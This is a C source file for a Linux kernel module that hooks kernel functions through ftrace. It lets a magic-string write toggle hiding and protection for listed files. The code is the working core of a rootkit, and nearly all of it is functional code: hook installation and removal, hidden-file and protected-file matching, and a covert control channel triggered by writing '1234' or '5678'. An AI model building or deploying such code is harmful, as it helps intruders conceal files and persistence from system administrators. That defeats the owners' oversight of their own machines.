#include "hooked.h"

ssize_t fake_write(struct file * filp, const char __user * buf, size_t count,
                   loff_t * offset)
{
    char message[128];
    memset(message, 0, 127);

    if(copy_from_user(message,buf,127) != 0)
    {
        return EFAULT;
    }

    if(strstr(message, "1234") != NULL)
    {
        fs_hidden = fs_hidden ? 0 : 1;
    }

    if(strstr(message, "5678") != NULL)
    {
        fs_protect = fs_protect ? 0 : 1;
    }

    return count;
}


int check_fs_blocklist(char *input)
{
    int i = 0;

    if (fs_protect==0)
    {
        return 0;
    }

    if (strlen(protected_files[0]) <= 2)
    {
        return 0;
    }

    while (i != protected_index)
    {
        if(strstr(input, protected_files[i]) != NULL)
            return 1;
        i++;
    }

    return 0;
}

int check_fs_hidelist(char *input)
{
    int i = 0;
    if (fs_hidden == 0)
    {
        return 0;
    }

    if (strlen(hidden_files[0]) <= 2)
    {
        return 0;
    }

    while (i != hidden_index)
    {
        if(strstr(input, hidden_files[i]) != NULL)
            return 1;
        i++;
    }

    return 0;
}

int fh_install_hook(struct ftrace_hook *hook)
{
    int error;

    error = fh_resolve_hook_address(hook);
    if (error)
    {
        return error;
    }

    hook->ops.func = fh_ftrace_thunk;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
    | FTRACE_OPS_FL_RECURSION
    | FTRACE_OPS_FL_IPMODIFY;

    error = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (error) 
    {
        DMSG("ftrace_set_filter_ip() failed: %d\n", error);
        return error;
    }

    error = register_ftrace_function(&hook->ops);
    if (error) 
    {
        DMSG("register_ftrace_function() failed: %d\n", error);
        ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
        return error;
    }

    return 0;
}


void fh_remove_hook(struct ftrace_hook *hook)
{
    int err;

    err = unregister_ftrace_function(&hook->ops);
    if (err) 
    {
        DMSG("unregister_ftrace_function() failed: %d\n", err);
    }

    err = ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0);
    if (err) 
    {
        DMSG("ftrace_set_filter_ip() failed: %d\n", err);
    }
}


int fh_install_hooks(struct ftrace_hook *hooks, size_t count)
{
    int err;
    size_t i;

    for (i = 0; i < count; i++) 
    {
        err = fh_install_hook(&hooks[i]);
        if (err)
        {
            while (i != 0) 
            {
                fh_remove_hook(&hooks[--i]);
            }
            return err;
        }
    }

    return 0;
}


void fh_remove_hooks(struct ftrace_hook *hooks, size_t count)
{
    size_t i;

    for (i = 0; i < count; i++)
    {
        fh_remove_hook(&hooks[i]);
    }
}
